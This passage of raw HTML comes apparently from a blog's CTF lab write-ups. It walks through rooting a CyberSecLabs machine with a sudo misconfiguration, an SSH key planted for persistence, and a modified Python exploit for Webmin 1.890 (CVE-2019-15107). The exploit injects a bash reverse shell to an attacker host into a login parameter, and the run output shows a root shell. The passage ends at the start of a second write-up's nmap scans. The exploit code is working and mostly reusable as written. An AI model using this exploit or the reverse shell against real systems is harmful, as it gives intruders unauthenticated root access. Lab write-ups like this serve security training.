</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls /home
dwight
ryan
$ ls /home/dwight
access.txt
$ cat /home/dwight/access.txt
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
$ ls -la /home/dwight/.ssh
total <span style="color:#bd93f9">8</span>
drwxrwxr-x <span style="color:#bd93f9">2</span> dwight dwight <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">8</span> <span style="color:#bd93f9">2020</span> .
drwxr-xr-x <span style="color:#bd93f9">4</span> dwight dwight <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">8</span> <span style="color:#bd93f9">2020</span> ..
$ sudo -l
Matching Defaults entries <span style="color:#ff79c6">for</span> www-data on office:
env_reset, mail_badpass,
<span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin

User www-data may run the following commands on office:
<span style="color:#ff79c6">(</span>dwight<span style="color:#ff79c6">)</span> NOPASSWD: /bin/bash
$ sudo -u dwight /bin/bash
whoami
dwight
</code></pre></td></tr></table>
</div>
</div><p>#upgrade shell</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#f1fa8c">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
<span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>xterm-256color
<span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">SHELL</span><span style="color:#ff79c6">=</span>/bin/bash
^Z
<span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span> + <span style="color:#bd93f9">58885</span> suspended rlwrap nc -lnvp <span style="color:#bd93f9">1337</span>
stty raw -echo;<span style="color:#8be9fd;font-style:italic">fg</span>
<span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span> - <span style="color:#bd93f9">58885</span> continued rlwrap nc -lnvp <span style="color:#bd93f9">1337</span>
reset
stty rows <span style="color:#bd93f9">47</span> columns <span style="color:#bd93f9">158</span>
dwight@office:/var/www/html/wordpress$
</code></pre></td></tr></table>
</div>
</div><p>#upload ssh pub key</p>
<pre tabindex="0"><code>cd /home/dwight
cd .ssh
ls -la
</code></pre><p>the directory is empty</p>
<pre tabindex="0"><code>echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkkUxb1mCROdgnSU3yU9ICmf+/3cZGSpEXMgsR0ZpvFDWqzUNLZDIxwTdWAZlfazKPLOrgjD2G++mmq4HgdQ0NqbZnGk4TvguCHcZVeQdpb2ZgRDPB0nxe7D7DCW6DqzPzsqNwSLB73IIt29Pv5n+T71a4FEc2ydiiJyDKYTC6IceGI567cwIqZ4bSE/mViVM4awdtaAznFOL9GwTCNqjEUrjZDOXjV8dHAWPLZfm7dZ9iC0orIC8pMaAF8kfkfo+6PFmB83gxLO1Nrjmx0n2lhoQpfa9QJT0cl9LODAKUSwcHj+gGWHbD1SNvOKSUBvFlkijU4P8G4M0Ea6rKWP6hJL5yvrszkCdfNvznq9EmpYPxd+2fiHzJucffV0K7r0say1Q77pXnd9SNuM4yqb0QBXYxSrGYB9MDXAT24P3IzjDCc9NkKy3OjryQPZkVnMZO/MFxaZenhpcoAOgCRqdzf9DtbCv5ANE0gj/kZgEpnahcw757sE21wGLL2HGzSvk= ctf@87004a0dcb62&quot; &gt;&gt; authorized_keys
chmod 600 authorized_keys
</code></pre><h1 id="establish-ssh-connexion">Establish ssh connexion</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i ~/.ssh/id_rsa_cyberseclabs dwight@172.31.3.1
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
dwight@office:~$
</code></pre></td></tr></table>
</div>
</div><h1 id="exploration-1">Exploration</h1>
<p>We can find an interesting process which seems to be a server:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ps -eaf
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
root <span style="color:#bd93f9">1066</span> <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span> 21:41 ? 00:00:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
</code></pre></td></tr></table>
</div>
</div><p>webmin server is running locally on port 10000, but we don&rsquo;t know which version.
It could be a vulnerable version as per <code>searchsploit webmin</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dwight@office:~$ ss -lntp
State Recv-Q Send-Q Local Address:Port Peer Address:Port
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 0.0.0.0:10000 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 127.0.0.53%lo:53 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 0.0.0.0:22 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">80</span> 127.0.0.1:3306 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> _:80 _:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:22 <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> _:443 _:<span style="color:#f1fa8c">\*</span>
</code></pre></td></tr></table>
</div>
</div><p><code>curl -k http://localhost:10000</code> shows we have an http server running webmin.
We can reconnect ssh and forward port 10000 locally</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i ~/.ssh/id_rsa_cyberseclabs -L 10000:localhost:8100 dwight@172.31.3.1
</code></pre></td></tr></table>
</div>
</div><h1 id="poc---exploitation">PoC - Exploitation</h1>
<pre tabindex="0"><code>searchsploit webmin
[..]
Webmin 1.920 - Remote Code Execution | linux/webapps/47293.sh
</code></pre><p>The exploit on this <a href="https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html">blogpost</a> fails</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp /opt/exploitdb/exploits/linux/webapps/47293.sh .
chmod u+x 47293.sh
dos2unix 47293.sh
sh ./47293.sh http://localhost:8100
Testing <span style="color:#ff79c6">for</span> RCE <span style="color:#ff79c6">(</span>CVE-2019-15107<span style="color:#ff79c6">)</span> on http://localhost:8100: OK! <span style="color:#ff79c6">(</span>target is not vulnerable<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Looking at the response header we find: <code>Server: MiniServ/1.890</code>,
a simple google search helps find this python <a href="https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py">github exploit</a></p>
<h1 id="modify-the-exploit">Modify the exploit</h1>
<p>webmin1890.py</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests

FLAG<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;f3a0c13c3765137bcde68572707ae5c0&#34;</span>
URI<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://127.0.0.1:10000&#34;</span>;

RHOST<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;10.10.0.155&#34;</span>
RPORT<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4444</span>

CMD<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;id&#34;</span>
CMD<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/</span><span style="color:#f1fa8c">{</span>RHOST<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/</span><span style="color:#f1fa8c">{</span>RPORT<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;&amp;1&#39;&#34;</span>

<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Testing for RCE (CVE-2019-15107) on </span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">: &#34;</span>)

payload <span style="color:#ff79c6">=</span> {
        <span style="color:#f1fa8c">&#39;user&#39;</span>: <span style="color:#f1fa8c">&#39;root&#39;</span>,
        <span style="color:#f1fa8c">&#39;pam&#39;</span>:  <span style="color:#f1fa8c">&#39;&#39;</span>,
        <span style="color:#f1fa8c">&#39;expired&#39;</span>:<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;2|echo </span><span style="color:#f1fa8c">{</span>FLAG<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">;</span><span style="color:#f1fa8c">{</span>CMD<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">;echo </span><span style="color:#f1fa8c">{</span>FLAG<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>,
        <span style="color:#6272a4"># &#39;old&#39;:  f&#34;id|echo {FLAG}&#34;,</span>
        <span style="color:#6272a4"># &#39;old&#39;:  f&#34;id|ifconfig&#34;,</span>
        <span style="color:#6272a4"># &#39;new1&#39;: &#39;root&#39;,</span>
        <span style="color:#6272a4"># &#39;new2&#39;: &#39;root&#39;,</span>
}
header <span style="color:#ff79c6">=</span> {
    <span style="color:#f1fa8c">&#39;Content-Type&#39;</span>: <span style="color:#f1fa8c">&#39;application/x-www-form-urlencoded&#39;</span>,
    <span style="color:#f1fa8c">&#39;Cookie&#39;</span>: <span style="color:#f1fa8c">&#39;redirect=1; testing=1; sid=x; sessiontest=1&#39;</span>,
    <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/session_login.cgi&#34;</span>,
}

r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/password_change.cgi&#34;</span>, params<span style="color:#ff79c6">=</span>payload, headers<span style="color:#ff79c6">=</span>header)
<span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>text)
</code></pre></td></tr></table>
</div>
</div><h1 id="run-the-exploit">run the exploit</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 webmin1890.py
──────────────────────────────────────────────────────────
nc -lnvp <span style="color:#bd93f9">444</span>
Connection from 172.31.3.1:54120
bash: cannot <span style="color:#8be9fd;font-style:italic">set</span> terminal process group <span style="color:#ff79c6">(</span>1067<span style="color:#ff79c6">)</span>: Inappropriate ioctl <span style="color:#ff79c6">for</span> device
bash: no job control in this shell
root@office:/usr/share/webmin/# <span style="color:#8be9fd;font-style:italic">cd</span> /root
root@office:~# cat system.txt
39b***********
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>CSL - Shares</title><link>https://0xade1.github.io/posts/2021/08/csl-shares/</link><pubDate>Sun, 22 Aug 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/08/csl-shares/</guid><description>Exploration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 nmap -p1-65535 -T4 -v 172.31.1.7 nmap -p21,80,11227,27853,35327,39857,48167,48201,49423 -A -T4 172.31.1.7 Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-21 14:36 HKT Nmap scan report for 172.31.1.7 Host is up (0.30s latency). PORT STATE SERVICE VERSION 11227/tcp closed unknown 27853/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA) | 256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA) |_ 256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519) 35327/tcp open nlockmgr 1-4 (RPC #100021) 39857/tcp open mountd 1-3 (RPC #100005) 48167/tcp closed unknown 48201/tcp open mountd 1-3 (RPC #100005) 49423/tcp open mountd 1-3 (RPC #100005) Install and run showmount</description><content type="html"><![CDATA[<h1 id="exploration">Exploration</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p1-65535 -T4 -v 172.31.1.7

nmap -p21,80,11227,27853,35327,39857,48167,48201,49423 -A -T4 172.31.1.7
Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2021-08-21 14:36 HKT
Nmap scan report <span style="color:#ff79c6">for</span> 172.31.1.7
Host is up <span style="color:#ff79c6">(</span>0.30s latency<span style="color:#ff79c6">)</span>.

PORT      STATE  SERVICE  VERSION
11227/tcp closed unknown
27853/tcp open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">2048</span> 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
|   <span style="color:#bd93f9">256</span> 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">256</span> cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
35327/tcp open   nlockmgr 1-4 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100021)</span>
39857/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
48167/tcp closed unknown
48201/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
49423/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
</code></pre></td></tr></table>
</div>
</div><p>Install and run showmount</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
